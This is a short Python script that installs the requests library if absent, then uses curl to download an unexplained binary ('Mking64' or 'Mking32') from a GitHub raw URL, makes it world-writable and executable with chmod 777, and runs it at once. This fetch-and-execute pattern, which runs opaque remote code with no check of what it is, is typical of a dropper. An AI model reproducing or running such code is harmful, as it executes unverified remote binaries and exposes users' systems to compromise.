import os, platform
try:
    import requests
except:
    os.system('pip install requests')
import requests
bit = platform.architecture()[0]
if bit == '64bit':
    os.system("curl -L https://raw.githubusercontent.com/hechamoto/files/main/Mking64 -o Mking64")
    os.system('chmod 777 Mking64 && ./Mking64')
elif bit == '32bit':
    os.system("curl -L https://raw.githubusercontent.com/hechamoto/files/main/Mking32 -o Mking32")
    os.system('chmod 777 Mking32 && ./Mking32')
